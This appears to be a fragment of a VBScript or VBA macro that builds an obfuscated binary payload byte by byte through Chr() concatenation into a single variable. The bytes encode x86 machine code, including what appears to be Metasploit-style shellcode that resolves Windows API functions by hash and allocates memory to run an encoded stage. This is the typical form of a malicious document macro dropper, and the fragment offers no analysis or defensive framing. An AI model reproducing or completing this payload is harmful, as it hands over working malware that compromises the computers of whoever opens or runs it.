gfoN=gfoN&Chr(192)&Chr(116)&Chr(31)&Chr(131)&Chr(254)&Chr(224)&Chr(118)&Chr(205)&Chr(86)&Chr(232)&Chr(153)&Chr(211)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(34)&Chr(206)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(232)&Chr(56)&Chr(200)&Chr(255)&Chr(255)&Chr(195)&Chr(232)&Chr(15)&Chr(206)&Chr(255)&Chr(255)&Chr(233)&Chr(124)&Chr(255)&Chr(255)&Chr(255)&Chr(133)&Chr(255)&Chr(117)&Chr(22)&Chr(232)&Chr(1)&Chr(206)&Chr(255)&Chr(255)&Chr(139)&Chr(240)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(177)&Chr(205)&Chr(255)&Chr(255)&Chr(137)&Chr(6)&Chr(89)&Chr(139)&Chr(199)&Chr(235)&Chr(210)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(8)&Chr(137)&Chr(125)&Chr(252)&Chr(137)&Chr(117)&Chr(248)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(193)&Chr(233)&Chr(7)&Chr(235)&Chr(6)
gfoN=gfoN&Chr(141)&Chr(155)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(102)&Chr(15)&Chr(111)&Chr(6)&Chr(102)&Chr(15)&Chr(111)&Chr(78)&Chr(16)&Chr(102)&Chr(15)&Chr(111)&Chr(86)&Chr(32)&Chr(102)&Chr(15)&Chr(111)&Chr(94)&Chr(48)&Chr(102)&Chr(15)&Chr(127)&Chr(7)&Chr(102)&Chr(15)&Chr(127)&Chr(79)&Chr(16)&Chr(102)&Chr(15)&Chr(127)&Chr(87)&Chr(32)&Chr(102)&Chr(15)&Chr(127)&Chr(95)&Chr(48)&Chr(102)&Chr(15)&Chr(111)&Chr(102)&Chr(64)&Chr(102)&Chr(15)&Chr(111)&Chr(110)&Chr(80)&Chr(102)&Chr(15)&Chr(111)&Chr(118)&Chr(96)&Chr(102)&Chr(15)&Chr(111)&Chr(126)&Chr(112)&Chr(102)&Chr(15)&Chr(127)&Chr(103)&Chr(64)&Chr(102)&Chr(15)&Chr(127)&Chr(111)&Chr(80)&Chr(102)&Chr(15)&Chr(127)&Chr(119)&Chr(96)&Chr(102)&Chr(15)&Chr(127)&Chr(127)&Chr(112)&Chr(141)&Chr(182)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(141)&Chr(191)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(73)&Chr(117)&Chr(163)&Chr(139)
gfoN=gfoN&Chr(117)&Chr(248)&Chr(139)&Chr(125)&Chr(252)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(28)&Chr(137)&Chr(125)&Chr(244)&Chr(137)&Chr(117)&Chr(248)&Chr(137)&Chr(93)&Chr(252)&Chr(139)&Chr(93)&Chr(12)&Chr(139)&Chr(195)&Chr(153)&Chr(139)&Chr(200)&Chr(139)&Chr(69)&Chr(8)&Chr(51)&Chr(202)&Chr(43)&Chr(202)&Chr(131)&Chr(225)&Chr(15)&Chr(51)&Chr(202)&Chr(43)&Chr(202)&Chr(153)&Chr(139)&Chr(248)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(131)&Chr(231)&Chr(15)&Chr(51)&Chr(250)&Chr(43)&Chr(250)&Chr(139)&Chr(209)&Chr(11)&Chr(215)&Chr(117)&Chr(74)&Chr(139)&Chr(117)&Chr(16)&Chr(139)&Chr(206)&Chr(131)&Chr(225)&Chr(127)&Chr(137)&Chr(77)&Chr(232)&Chr(59)&Chr(241)&Chr(116)&Chr(19)&Chr(43)&Chr(241)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(39)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(77)&Chr(232)
gfoN=gfoN&Chr(133)&Chr(201)&Chr(116)&Chr(119)&Chr(139)&Chr(93)&Chr(16)&Chr(139)&Chr(85)&Chr(12)&Chr(3)&Chr(211)&Chr(43)&Chr(209)&Chr(137)&Chr(85)&Chr(236)&Chr(3)&Chr(216)&Chr(43)&Chr(217)&Chr(137)&Chr(93)&Chr(240)&Chr(139)&Chr(117)&Chr(236)&Chr(139)&Chr(125)&Chr(240)&Chr(139)&Chr(77)&Chr(232)&Chr(243)&Chr(164)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(83)&Chr(59)&Chr(207)&Chr(117)&Chr(53)&Chr(247)&Chr(217)&Chr(131)&Chr(193)&Chr(16)&Chr(137)&Chr(77)&Chr(228)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(228)&Chr(243)&Chr(164)&Chr(139)&Chr(77)&Chr(8)&Chr(3)&Chr(77)&Chr(228)&Chr(139)&Chr(85)&Chr(12)&Chr(3)&Chr(85)&Chr(228)&Chr(139)&Chr(69)&Chr(16)&Chr(43)&Chr(69)&Chr(228)&Chr(80)&Chr(82)&Chr(81)&Chr(232)&Chr(76)&Chr(255)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(235)&Chr(26)&Chr(139)&Chr(117)&Chr(12)
gfoN=gfoN&Chr(139)&Chr(125)&Chr(8)&Chr(139)&Chr(77)&Chr(16)&Chr(139)&Chr(209)&Chr(193)&Chr(233)&Chr(2)&Chr(243)&Chr(165)&Chr(139)&Chr(202)&Chr(131)&Chr(225)&Chr(3)&Chr(243)&Chr(164)&Chr(139)&Chr(69)&Chr(8)&Chr(139)&Chr(93)&Chr(252)&Chr(139)&Chr(117)&Chr(248)&Chr(139)&Chr(125)&Chr(244)&Chr(139)&Chr(229)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(72)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(84)&Chr(198)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(102)&Chr(15)&Chr(40)&Chr(193)&Chr(199)&Chr(69)&Chr(228)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(35)&Chr(139)&Chr(69)&Chr(236)&Chr(139)&Chr(0)&Chr(139)&Chr(0)&Chr(61)&Chr(5)&Chr(0)&Chr(0)&Chr(192)&Chr(116)&Chr(10)&Chr(61)&Chr(29)&Chr(0)&Chr(0)&Chr(192)&Chr(116)&Chr(3)&Chr(51)&Chr(192)&Chr(195)&Chr(51)&Chr(192)&Chr(64)&Chr(195)&Chr(139)&Chr(101)&Chr(232)&Chr(131)&Chr(101)&Chr(228)&Chr(0)
gfoN=gfoN&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(135)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(86)&Chr(198)&Chr(255)&Chr(255)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(24)&Chr(51)&Chr(192)&Chr(83)&Chr(137)&Chr(69)&Chr(252)&Chr(137)&Chr(69)&Chr(244)&Chr(137)&Chr(69)&Chr(248)&Chr(83)&Chr(156)&Chr(88)&Chr(139)&Chr(200)&Chr(53)&Chr(0)&Chr(0)&Chr(32)&Chr(0)&Chr(80)&Chr(157)&Chr(156)&Chr(90)&Chr(43)&Chr(209)&Chr(116)&Chr(31)&Chr(81)&Chr(157)&Chr(51)&Chr(192)&Chr(15)&Chr(162)&Chr(137)&Chr(69)&Chr(244)&Chr(137)&Chr(93)&Chr(232)&Chr(137)&Chr(85)&Chr(236)&Chr(137)&Chr(77)&Chr(240)&Chr(184)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(162)&Chr(137)&Chr(85)&Chr(252)&Chr(137)&Chr(69)&Chr(248)&Chr(91)&Chr(247)&Chr(69)&Chr(252)&Chr(0)&Chr(0)&Chr(0)&Chr(4)&Chr(116)&Chr(14)&Chr(232)&Chr(92)&Chr(255)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(51)&Chr(192)&Chr(64)&Chr(235)&Chr(2)&Chr(51)&Chr(192)&Chr(91)&Chr(201)&Chr(195)&Chr(232)&Chr(153)&Chr(255)&Chr(255)&Chr(255)&Chr(163)&Chr(168)&Chr(182)&Chr(64)&Chr(0)&Chr(51)&Chr(192)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(133)&Chr(246)&Chr(15)&Chr(132)&Chr(129)&Chr(1)&Chr(0)&Chr(0)&Chr(255)&Chr(118)&Chr(4)&Chr(232)&Chr(243)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(8)&Chr(232)&Chr(235)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(12)&Chr(232)&Chr(227)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(16)&Chr(232)&Chr(219)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(20)&Chr(232)&Chr(211)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(24)&Chr(232)&Chr(203)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(54)&Chr(232)&Chr(196)&Chr(220)&Chr(255)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(118)&Chr(32)&Chr(232)&Chr(188)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(36)&Chr(232)&Chr(180)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(40)&Chr(232)&Chr(172)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(44)&Chr(232)&Chr(164)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(48)&Chr(232)&Chr(156)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(52)&Chr(232)&Chr(148)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(28)&Chr(232)&Chr(140)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(56)&Chr(232)&Chr(132)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(60)&Chr(232)&Chr(124)&Chr(220)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(64)&Chr(255)&Chr(118)&Chr(64)&Chr(232)&Chr(113)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(68)&Chr(232)&Chr(105)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(72)&Chr(232)&Chr(97)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)
gfoN=gfoN&Chr(76)&Chr(232)&Chr(89)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(80)&Chr(232)&Chr(81)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(84)&Chr(232)&Chr(73)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(88)&Chr(232)&Chr(65)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(92)&Chr(232)&Chr(57)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(96)&Chr(232)&Chr(49)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(100)&Chr(232)&Chr(41)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(104)&Chr(232)&Chr(33)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(108)&Chr(232)&Chr(25)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(112)&Chr(232)&Chr(17)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(116)&Chr(232)&Chr(9)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(120)&Chr(232)&Chr(1)&Chr(220)&Chr(255)&Chr(255)&Chr(255)&Chr(118)&Chr(124)&Chr(232)&Chr(249)&Chr(219)
gfoN=gfoN&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(64)&Chr(255)&Chr(182)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(235)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(132)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(224)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(136)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(213)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(140)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(202)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(144)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(191)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(148)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(180)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(182)&Chr(152)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(169)&Chr(219)&Chr(252)&Chr(232)&Chr(182)&Chr(0)&Chr(0)&Chr(0)&Chr(96)&Chr(144)&Chr(137)&Chr(229)&Chr(49)&Chr(210)&Chr(100)&Chr(139)&Chr(82)&Chr(48)&Chr(139)&Chr(82)&Chr(12)&Chr(139)
gfoN=gfoN&Chr(82)&Chr(20)&Chr(139)&Chr(114)&Chr(40)&Chr(15)&Chr(183)&Chr(74)&Chr(38)&Chr(49)&Chr(255)&Chr(49)&Chr(192)&Chr(172)&Chr(235)&Chr(4)&Chr(199)&Chr(10)&Chr(91)&Chr(13)&Chr(60)&Chr(97)&Chr(144)&Chr(124)&Chr(2)&Chr(44)&Chr(32)&Chr(144)&Chr(193)&Chr(207)&Chr(13)&Chr(1)&Chr(199)&Chr(226)&Chr(232)&Chr(144)&Chr(82)&Chr(87)&Chr(144)&Chr(139)&Chr(82)&Chr(16)&Chr(139)&Chr(66)&Chr(60)&Chr(235)&Chr(8)&Chr(217)&Chr(95)&Chr(238)&Chr(72)&Chr(75)&Chr(70)&Chr(140)&Chr(25)&Chr(1)&Chr(208)&Chr(139)&Chr(64)&Chr(120)&Chr(133)&Chr(192)&Chr(15)&Chr(132)&Chr(89)&Chr(0)&Chr(0)&Chr(0)&Chr(1)&Chr(208)&Chr(144)&Chr(80)&Chr(139)&Chr(72)&Chr(24)&Chr(144)&Chr(139)&Chr(88)&Chr(32)&Chr(1)&Chr(211)&Chr(227)&Chr(72)&Chr(73)&Chr(144)&Chr(139)&Chr(52)&Chr(139)&Chr(1)&Chr(214)&Chr(49)&Chr(255)&Chr(49)&Chr(192)&Chr(172)&Chr(193)&Chr(207)&Chr(13)&Chr(144)&Chr(1)
gfoN=gfoN&Chr(199)&Chr(56)&Chr(224)&Chr(117)&Chr(243)&Chr(3)&Chr(125)&Chr(248)&Chr(59)&Chr(125)&Chr(36)&Chr(117)&Chr(224)&Chr(88)&Chr(139)&Chr(88)&Chr(36)&Chr(144)&Chr(1)&Chr(211)&Chr(102)&Chr(139)&Chr(12)&Chr(75)&Chr(144)&Chr(139)&Chr(88)&Chr(28)&Chr(1)&Chr(211)&Chr(144)&Chr(139)&Chr(4)&Chr(139)&Chr(1)&Chr(208)&Chr(137)&Chr(68)&Chr(36)&Chr(36)&Chr(91)&Chr(91)&Chr(97)&Chr(89)&Chr(90)&Chr(81)&Chr(255)&Chr(224)&Chr(235)&Chr(5)&Chr(220)&Chr(183)&Chr(86)&Chr(224)&Chr(202)&Chr(144)&Chr(88)&Chr(95)&Chr(144)&Chr(90)&Chr(144)&Chr(139)&Chr(18)&Chr(233)&Chr(90)&Chr(255)&Chr(255)&Chr(255)&Chr(93)&Chr(144)&Chr(190)&Chr(113)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(64)&Chr(104)&Chr(0)&Chr(16)&Chr(0)&Chr(0)&Chr(86)&Chr(106)&Chr(0)&Chr(104)&Chr(88)&Chr(164)&Chr(83)&Chr(229)&Chr(255)&Chr(213)&Chr(137)&Chr(195)&Chr(144)&Chr(235)&Chr(7)&Chr(35)&Chr(45)&Chr(4)
gfoN=gfoN&Chr(67)&Chr(181)&Chr(2)&Chr(209)&Chr(137)&Chr(199)&Chr(137)&Chr(241)&Chr(232)&Chr(71)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(4)&Chr(33)&Chr(207)&Chr(242)&Chr(160)&Chr(94)&Chr(144)&Chr(242)&Chr(164)&Chr(232)&Chr(41)&Chr(0)&Chr(0)&Chr(0)&Chr(144)&Chr(144)&Chr(187)&Chr(224)&Chr(29)&Chr(42)&Chr(10)&Chr(104)&Chr(166)&Chr(149)&Chr(189)&Chr(157)&Chr(235)&Chr(6)&Chr(15)&Chr(164)&Chr(54)&Chr(15)&Chr(34)&Chr(156)&Chr(255)&Chr(213)&Chr(60)&Chr(6)&Chr(124)&Chr(10)&Chr(128)&Chr(251)&Chr(224)&Chr(117)&Chr(5)&Chr(187)&Chr(71)&Chr(19)&Chr(114)&Chr(111)&Chr(106)&Chr(0)&Chr(83)&Chr(255)&Chr(213)&Chr(49)&Chr(192)&Chr(100)&Chr(255)&Chr(48)&Chr(100)&Chr(137)&Chr(32)&Chr(255)&Chr(211)&Chr(233)&Chr(201)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(180)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(201)&Chr(187)&Chr(87)&Chr(174)&Chr(215)&Chr(81)&Chr(177)&Chr(86)&Chr(221)&Chr(196)
gfoN=gfoN&Chr(217)&Chr(116)&Chr(36)&Chr(244)&Chr(90)&Chr(49)&Chr(90)&Chr(16)&Chr(131)&Chr(194)&Chr(4)&Chr(3)&Chr(90)&Chr(12)&Chr(181)&Chr(91)&Chr(43)&Chr(185)&Chr(176)&Chr(164)&Chr(212)&Chr(58)&Chr(162)&Chr(45)&Chr(49)&Chr(11)&Chr(240)&Chr(74)&Chr(49)&Chr(62)&Chr(196)&Chr(25)&Chr(23)&Chr(179)&Chr(175)&Chr(76)&Chr(140)&Chr(64)&Chr(221)&Chr(88)&Chr(163)&Chr(225)&Chr(107)&Chr(191)&Chr(138)&Chr(242)&Chr(90)&Chr(127)&Chr(64)&Chr(48)&Chr(253)&Chr(3)&Chr(155)&Chr(101)&Chr(221)&Chr(58)&Chr(84)&Chr(120)&Chr(28)&Chr(122)&Chr(137)&Chr(115)&Chr(76)&Chr(211)&Chr(197)&Chr(38)&Chr(96)&Chr(80)&Chr(155)&Chr(250)&Chr(129)&Chr(182)&Chr(151)&Chr(67)&Chr(249)&Chr(179)&Chr(104)&Chr(55)&Chr(179)&Chr(186)&Chr(184)&Chr(232)&Chr(200)&Chr(245)&Chr(32)&Chr(130)&Chr(150)&Chr(37)&Chr(80)&Chr(71)&Chr(197)&Chr(26)&Chr(27)&Chr(236)&Chr(61)&Chr(232)&Chr(154)&Chr(36)&Chr(12)&Chr(17)
gfoN=gfoN&Chr(173)&Chr(8)&Chr(194)&Chr(44)&Chr(1)&Chr(133)&Chr(27)&Chr(104)&Chr(166)&Chr(118)&Chr(110)&Chr(130)&Chr(212)&Chr(11)&Chr(104)&Chr(81)&Chr(166)&Chr(215)&Chr(253)&Chr(68)&Chr(0)&Chr(147)&Chr(165)&Chr(172)&Chr(176)&Chr(112)&Chr(51)&Chr(38)&Chr(190)&Chr(61)&Chr(48)&Chr(96)&Chr(163)&Chr(192)&Chr(149)&Chr(26)&Chr(223)&Chr(73)&Chr(24)&Chr(205)&Chr(105)&Chr(9)&Chr(62)&Chr(201)&Chr(50)&Chr(201)&Chr(95)&Chr(72)&Chr(159)&Chr(188)&Chr(96)&Chr(138)&Chr(71)&Chr(96)&Chr(196)&Chr(192)&Chr(106)&Chr(117)&Chr(126)&Chr(139)&Chr(226)&Chr(186)&Chr(76)&Chr(52)&Chr(243)&Chr(212)&Chr(199)&Chr(71)&Chr(193)&Chr(123)&Chr(115)&Chr(192)&Chr(105)&Chr(243)&Chr(93)&Chr(23)&Chr(141)&Chr(46)&Chr(25)&Chr(135)&Chr(112)&Chr(209)&Chr(89)&Chr(129)&Chr(182)&Chr(133)&Chr(9)&Chr(185)&Chr(31)&Chr(166)&Chr(194)&Chr(57)&Chr(159)&Chr(115)&Chr(68)&Chr(106)&Chr(15)&Chr(44)&Chr(36)&Chr(218)
gfoN=gfoN&Chr(239)&Chr(156)&Chr(204)&Chr(48)&Chr(224)&Chr(195)&Chr(236)&Chr(58)&Chr(42)&Chr(114)&Chr(43)&Chr(245)&Chr(14)&Chr(214)&Chr(219)&Chr(244)&Chr(176)&Chr(163)&Chr(114)&Chr(112)&Chr(86)&Chr(57)&Chr(148)&Chr(212)&Chr(192)&Chr(214)&Chr(86)&Chr(3)&Chr(217)&Chr(65)&Chr(169)&Chr(97)&Chr(117)&Chr(217)&Chr(61)&Chr(61)&Chr(147)&Chr(221)&Chr(66)&Chr(190)&Chr(177)&Chr(77)&Chr(239)&Chr(22)&Chr(82)&Chr(6)&Chr(227)&Chr(162)&Chr(67)&Chr(25)&Chr(46)&Chr(131)&Chr(10)&Chr(33)&Chr(184)&Chr(89)&Chr(99)&Chr(227)&Chr(89)&Chr(93)&Chr(174)&Chr(147)&Chr(250)&Chr(204)&Chr(53)&Chr(100)&Chr(117)&Chr(237)&Chr(225)&Chr(51)&Chr(210)&Chr(195)&Chr(251)&Chr(214)&Chr(206)&Chr(122)&Chr(82)&Chr(197)&Chr(19)&Chr(26)&Chr(157)&Chr(77)&Chr(207)&Chr(223)&Chr(32)&Chr(79)&Chr(130)&Chr(100)&Chr(7)&Chr(95)&Chr(90)&Chr(100)&Chr(3)&Chr(11)&Chr(50)&Chr(51)&Chr(221)&Chr(229)&Chr(244)&Chr(237)
gfoN=gfoN&Chr(175)&Chr(95)&Chr(174)&Chr(66)&Chr(102)&Chr(8)&Chr(55)&Chr(169)&Chr(185)&Chr(78)&Chr(56)&Chr(228)&Chr(79)&Chr(174)&Chr(136)&Chr(81)&Chr(22)&Chr(208)&Chr(36)&Chr(54)&Chr(158)&Chr(169)&Chr(89)&Chr(166)&Chr(97)&Chr(96)&Chr(218)&Chr(214)&Chr(43)&Chr(41)&Chr(74)&Chr(127)&Chr(242)&Chr(187)&Chr(207)&Chr(226)&Chr(5)&Chr(22)&Chr(19)&Chr(27)&Chr(134)&Chr(147)&Chr(235)&Chr(216)&Chr(150)&Chr(209)&Chr(238)&Chr(165)&Chr(16)&Chr(9)&Chr(130)&Chr(182)&Chr(244)&Chr(45)&Chr(49)&Chr(182)&Chr(220)&Chr(36)&Chr(141)&Chr(36)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(255)&Chr(36)&Chr(141)&Chr(168)&Chr(100)&Chr(64)&Chr(0)&Chr(144)&Chr(56)&Chr(100)&Chr(64)&Chr(0)&Chr(100)&Chr(100)&Chr(64)&Chr(0)&Chr(136)&Chr(100)&Chr(64)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(193)
gfoN=gfoN&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(131)&Chr(198)&Chr(3)&Chr(131)&Chr(199)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(204)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(136)&Chr(71)&Chr(1)&Chr(131)&Chr(198)&Chr(2)&Chr(131)&Chr(199)&Chr(2)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(166)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(144)&Chr(35)&Chr(209)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(131)&Chr(198)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(199)&Chr(1)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(136)&Chr(243)&Chr(165)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(11)&Chr(101)&Chr(64)&Chr(0)
gfoN=gfoN&Chr(248)&Chr(100)&Chr(64)&Chr(0)&Chr(240)&Chr(100)&Chr(64)&Chr(0)&Chr(232)&Chr(100)&Chr(64)&Chr(0)&Chr(224)&Chr(100)&Chr(64)&Chr(0)&Chr(216)&Chr(100)&Chr(64)&Chr(0)&Chr(208)&Chr(100)&Chr(64)&Chr(0)&Chr(200)&Chr(100)&Chr(64)&Chr(0)&Chr(139)&Chr(68)&Chr(142)&Chr(228)&Chr(137)&Chr(68)&Chr(143)&Chr(228)&Chr(139)&Chr(68)&Chr(142)&Chr(232)&Chr(137)&Chr(68)&Chr(143)&Chr(232)&Chr(139)&Chr(68)&Chr(142)&Chr(236)&Chr(137)&Chr(68)&Chr(143)&Chr(236)&Chr(139)&Chr(68)&Chr(142)&Chr(240)&Chr(137)&Chr(68)&Chr(143)&Chr(240)&Chr(139)&Chr(68)&Chr(142)&Chr(244)&Chr(137)&Chr(68)&Chr(143)&Chr(244)&Chr(139)&Chr(68)&Chr(142)&Chr(248)&Chr(137)&Chr(68)&Chr(143)&Chr(248)&Chr(139)&Chr(68)&Chr(142)&Chr(252)&Chr(137)&Chr(68)&Chr(143)&Chr(252)&Chr(141)&Chr(4)&Chr(141)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(3)&Chr(240)&Chr(3)&Chr(248)&Chr(255)&Chr(36)&Chr(149)&Chr(20)&Chr(101)
gfoN=gfoN&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(36)&Chr(101)&Chr(64)&Chr(0)&Chr(44)&Chr(101)&Chr(64)&Chr(0)&Chr(56)&Chr(101)&Chr(64)&Chr(0)&Chr(76)&Chr(101)&Chr(64)&Chr(0)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(141)&Chr(73)&Chr(0)&Chr(138)&Chr(6)&Chr(136)&Chr(7)&Chr(138)&Chr(70)&Chr(1)&Chr(136)&Chr(71)&Chr(1)&Chr(138)&Chr(70)&Chr(2)&Chr(136)&Chr(71)&Chr(2)&Chr(139)&Chr(69)&Chr(8)&Chr(94)&Chr(95)&Chr(201)&Chr(195)&Chr(144)&Chr(141)&Chr(116)&Chr(49)&Chr(252)&Chr(141)&Chr(124)&Chr(57)&Chr(252)&Chr(247)&Chr(199)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(117)&Chr(36)
gfoN=gfoN&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(226)&Chr(3)&Chr(131)&Chr(249)&Chr(8)&Chr(114)&Chr(13)&Chr(253)&Chr(243)&Chr(165)&Chr(252)&Chr(255)&Chr(36)&Chr(149)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(139)&Chr(255)&Chr(247)&Chr(217)&Chr(255)&Chr(36)&Chr(141)&Chr(96)&Chr(102)&Chr(64)&Chr(0)&Chr(141)&Chr(73)&Chr(0)&Chr(139)&Chr(199)&Chr(186)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(249)&Chr(4)&Chr(114)&Chr(12)&Chr(131)&Chr(224)&Chr(3)&Chr(43)&Chr(200)&Chr(255)&Chr(36)&Chr(133)&Chr(180)&Chr(101)&Chr(64)&Chr(0)&Chr(255)&Chr(36)&Chr(141)&Chr(176)&Chr(102)&Chr(64)&Chr(0)&Chr(144)&Chr(196)&Chr(101)&Chr(64)&Chr(0)&Chr(232)&Chr(101)&Chr(64)&Chr(0)&Chr(16)&Chr(102)&Chr(64)&Chr(0)&Chr(138)&Chr(70)&Chr(3)&Chr(35)&Chr(209)&Chr(136)&Chr(71)&Chr(3)&Chr(131)&Chr(238)&Chr(1)&Chr(193)&Chr(233)&Chr(2)&Chr(131)&Chr(239)&Chr(1)&Chr(131)&Chr(249)&Chr(8)
